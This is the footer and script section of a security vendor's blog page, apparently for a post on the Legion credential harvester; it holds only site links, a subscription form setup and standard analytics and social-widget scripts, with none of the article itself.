                <a href="https://azuremarketplace.microsoft.com/en-us/marketplace/apps/cadosecurityltd1626856705534.cado-response?tab=Overview" target="_blank" aria-label="Azure" rel="noopener">
                 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/azure-logo-white-circle-1-600x600.svg" alt="Azure icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://console.cloud.google.com/marketplace/product/cado-public/cado-response?pli=1" target="_blank" aria-label="Google Cloud" rel="noopener">
                   <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/google-cloud-icon-2048x1646-7admxejz.svg" alt="Google Cloud icon" loading="lazy">
                </a>
              </li>
              

            </ul>
          </div>
          
          <div class="links">
              <div class="copyright">Copyright© 2024, Cado Security, All Rights Reserved <a href="/privacy-policy/">Privacy Policy</a></div>
            </div>
        </div>

         <div class="logo">
          <a href="https://www.cadosecurity.com/">
            <img loading="lazy" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/footer-logo.svg" width="144" height="29" alt="footer-logo">
          </a>
        </div>
      </div>
    </div>
  </footer></div>

    
    
    
    <script src="/hs/hsstatic/jquery-libs/static-1.1/jquery/jquery-1.7.1.js"></script>
<script>hsjQuery = window['jQuery'];</script>
<!-- HubSpot performance collection script -->
<script defer src="https://static.hsappstatic.net/content-cwv-embed/static-1.1293/embed.js"></script>

<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js" integrity="sha256-4mJNT2bMXxcc1GCJaxBmMPdmah5ji0Ldnd79DKd1hoM=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha256-AjM0J5XIbiB590BrznLEgZGLnOQWrt62s3BEq65Q/I0=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js" integrity="sha256-NSwb7O0HrDJcC+2SASgGuCP8+tdpIhqnzLTZkGRJRCk=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" integrity="sha256-qf3MqHLzDh4qqAnc9QVmqjEWBA4CfzP1YwRFbfNfpnE=" crossorigin="anonymous"></script>
<script>
// Stick sharing
document.addEventListener('DOMContentLoaded', function() {

    var Sticky = new hcSticky('#share', {
      stickTo: '.u4m-blog-post .body',
      top: 150
    });
  
});
</script>

<script src="//cdn2.hubspot.net/hub/14518100/hub_generated/template_assets/156174727468/1712250848645/cado-unified4-srw/js/main.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/scripts/jquery-3.5.1.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/hubspot.search.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/jquery.nb.offscreenMenuToggle.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/aos3.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified-assets/lazyload.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/js.cookie.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/hc-sticky.js"></script>
<script src="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156175596464/1728675367793/module_156175596464_u4m-header.min.js"></script>

    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->

<script data-hs-allowed="true" src="/_hcms/forms/v2.js"></script>

  <script data-hs-allowed="true">
      hbspt.forms.create({
          portalId: '14518100',
          formId: 'd29e7ad7-b066-4fe0-b1ea-e5dcd4c55e5a',
          formInstanceId: '9485',
          pageId: '156195647570',
          region: 'na1',
          
          pageName: 'Legion: an AWS Credential Harvester and SMTP Hijacker',
          
          contentType: 'blog-post',
          
          formsBaseUrl: '/_hcms/forms/',
          
          
          inlineMessage: "<p>Thanks for subscribing!</p>",
          
          css: '',
          target: '#hs_form_target_u4m-subscribe_blog_subscribe_9485',
          
          formData: {
            cssClass: 'hs-form stacked'
          }
      });
  </script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cadosecurity.com\/blog\/legion-an-aws-credential-harvester-and-smtp-hijacker"]);
_hsq.push(["setPageId", "156195647570"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 156195647570,
    "legacyPageId": "156195647570",
    "contentFolderId": null,
    "contentGroupId": 156179862661,
    "abTestId": null,
    "languageVariantId": 156195647570,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/14518100.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "bcc3ce1f-72cb-4434-b5af-5ef9e682f79d",
    ticks: 1729739193818,
    page_id: 156195647570,
    
    content_group_id: 156179862661,
    portal_id: 14518100,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    analytics_page_id: "156195647570",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.354/js/index.js"></script>

<!--
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P9BDTK9"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 -->

<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 



</body></html>